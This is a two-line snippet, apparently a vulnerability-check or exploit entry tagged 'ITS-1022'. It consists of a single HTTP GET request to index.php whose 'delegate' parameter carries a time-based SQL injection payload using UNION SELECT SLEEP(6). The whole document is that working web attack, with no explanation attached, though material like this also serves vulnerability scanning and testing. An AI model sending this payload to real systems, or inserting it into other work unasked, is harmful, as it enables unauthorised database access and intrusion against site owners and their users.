# Vulnerable: ITS-1022
GET /index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept
